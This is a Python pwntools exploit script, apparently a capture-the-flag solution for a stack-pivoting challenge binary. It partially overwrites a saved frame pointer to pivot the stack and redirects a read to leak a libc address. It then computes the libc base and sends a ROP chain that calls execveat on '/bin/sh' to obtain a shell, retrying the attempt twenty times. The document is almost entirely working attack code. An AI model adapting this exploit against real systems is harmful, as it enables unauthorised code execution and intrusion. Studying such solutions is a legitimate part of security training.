from pwn import *
from pwnlib import timeout

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)


def get_io():

    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        io = remote("", 9999)

    return io


def ddebug(io, b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def pwn(io):
    # stack pivoting准备工作，设置 rbp=rbp-0x10
    io.sendlineafter("pivoting", "1")
    io.sendlineafter("size:", "1")
    io.sendlineafter("index:", "16")
    io.send("\x40")

    # stack pivoting
    io.sendlineafter("pivoting", "2")

    # read返回地址改写->write
    io.sendlineafter("pivoting", "1")
    io.sendlineafter("size: ", str(0x100))
    io.sendlineafter("index: ", "0")
    io.send("\x45")

    data = io.recv(8)
    if b"1. st" in data:
        return

    leak = u64(io.recvuntil("\x7f", timeout=0.1)[-6:].ljust(8, b"\x00"))
    if leak < 1: return

    libc.address = leak - 0x2a150 - 122
    log.success("libc.address:-----> " + hex(libc.address))

    """
    0x0000000000110a4d : pop rsi ; ret
    0x000000000010f75b : pop rdi ; ret
    0x00000000000a877e : pop rcx ; ret
    """
    # rop
    sleep(0.1)
    io.sendline(str(0x200))
    io.sendlineafter("index: ", "0")
    pop_rdi = libc.address + 0x10f75b
    pop_rsi = libc.address + 0x110a4d
    pop_rcx = libc.address + 0xa877e
    rdx = libc.address + 0xb5db0  # xor edx, edx; mov eax, edx; ret
    r8 = libc.address + 0x9874e  # pop r8; mov qword ptr fs:[0x300], rdi; ret
    payload = flat(pop_rdi, 0,
                   pop_rsi, next(libc.search(b'/bin/sh')),
                   rdx, pop_rcx, 0, r8, 0,
                   libc.symbols['execveat'])
    ddebug(io, "breakrva 0x14A5 \ncontinue")
    io.send(payload)

    io.interactive()


for i in range(20):
    io = get_io()
    try:
        pwn(io)
    except:
        pass
    finally:
        io.close()
